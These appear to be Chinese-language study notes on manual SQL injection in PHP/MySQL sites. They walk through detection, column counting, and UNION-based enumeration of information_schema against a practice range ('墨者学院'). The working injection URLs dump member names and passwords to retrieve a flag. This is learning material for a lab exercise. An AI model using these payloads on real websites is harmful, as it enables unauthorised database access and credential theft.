**1.PHP（MYSQL）**

  条件：参数传递，执行恶意sql语句，实现自定义攻击。

  产生原理：存在可控变量，带入数据库查询，过滤不完全

> www.huazige.com/index.php?id=2
>
> www.huazige.com/?id=4
>
> www.huazige.com/?id=8&x=1
>
> www.huazige.com/index.php
>
> 问：哪几个可能存在注入的网站？
>
> 均是 ，其存在变量，最后一个可能为POST类型

选定注入参数，进行sql语句注入0

www.xxx.com/?id=2&page=5,若存在注入参数为id，则为id=2 and 1=1这样，反之为page=5 and 1=1,在使用sqlmap等工具时要注意；不然就是乱搞。

**2.SQL注入思路：**

​    网站域名/IP --->数据库名 --->表名 ---> 字段 ---> 数据

如何判断注入点？

老办法： and 1=1 ----->页面正常   

​				and 1=2 ------页面错误    可能存在注入点

新方法：select * from users where id =1 limit 1,2  包含一定的数据逻辑关系，And or xor 。

记住要判定写的测试语句是否带入数据库查询，查看返回的页面/结果！

**3.手工注入流程：**

拿钱都买不到的小秘密：

​    在MYSQL5.0以上版本中，mysql存在一个自带数据库名为information_achema,它是一个存储记录；1所有数据库名，字段，数据的数据库，我们可以通过它来查询其他数据库的相关信息，这叫有依据的查询。

  数据库中符号"."代表下一级，比如edu.user表示edu数据库下的user表名

1#判断注入

2# 猜解列名（字段数）      order by x  判断错误与正常的x值

3#根据报错进行猜解

4#信息搜集

  数据库名：database()								 mozhe_Discuz_StormGroup 

  数据库版本：version()                                5.7.22-0ubuntu0.16.04.1 

  操作系统信息：@@version_compile_os		 Linux 

  数据库用户：user()  										 root@localhost 

联合查询查看数据库名：

> 由于该数据库的版本高于5.0，所以根据数据库 information_schema进行相关的程序；
>
> 靶场：墨者学院
>
> http://219.153.49.228:45866/new_list.php?%20id=666 union select 1,schema_name,3,4 from information_schema.schemata  limit 0,1  查询数据库，读取0，1的数据

![1619238589230](C:\Users\MCY\AppData\Roaming\Typora\typora-user-images\1619238589230.png)

>  http://219.153.49.228:45866/new_list.php?%20id=666 union select 1,schema_name,3,4 from information_schema.schemata limit 1,1  查询数据库，读取1，1的数据

![1619238849251](C:\Users\MCY\AppData\Roaming\Typora\typora-user-images\1619238849251.png)

>  http://219.153.49.228:45866/new_list.php?%20id=666 union select 1,schema_name,3,4 from information_schema.schemata limit 1,1
>
> 其中修改 limit x,y 的值，可以得到不同的数据库名称
>
> http://219.153.49.228:45866/new_list.php?%20id=666 union select 1,table_name,3,4 from information_schema.tables where table_schema='mozhe_Discuz_StormGroup' limit 0,1
>
> 查询数据库mozhe_Discuz_StormGroup的表名

 ![1619246390447](C:\Users\MCY\AppData\Roaming\Typora\typora-user-images\1619246390447.png)

同理，可以根据上面的语句，查询其他的表的字段，查出为‘notice’

既然表名和字段名已经查到了，就要查询字段里的数据了；

> http://219.153.49.228:45866/new_list.php?%20id=666 union select 1,column_type,column_name from information_schema.columns where table_name='StormGroup_member' limit 0,1
>
> http://219.153.49.228:45866/new_list.php?%20id=666  union select 1,concat(name,’-’,password,’-’,status),3,4 from mozhe_Discuz_StormGroup.StormGroup_member limit 0,1

 ![img](https://img-blog.csdnimg.cn/20190116142213955.png) 

>  http://219.153.49.228:45866/new_list.php?%20id=666  union select 1,concat(name,’-’,password,’-’,status),3,4 from mozhe_Discuz_StormGroup.StormGroup_member limit 1,1 

 ![img](https://img-blog.csdnimg.cn/20190116142237703.png) 

于是就可以拿到key了。除此之外我们可以用其他工具进行扫描。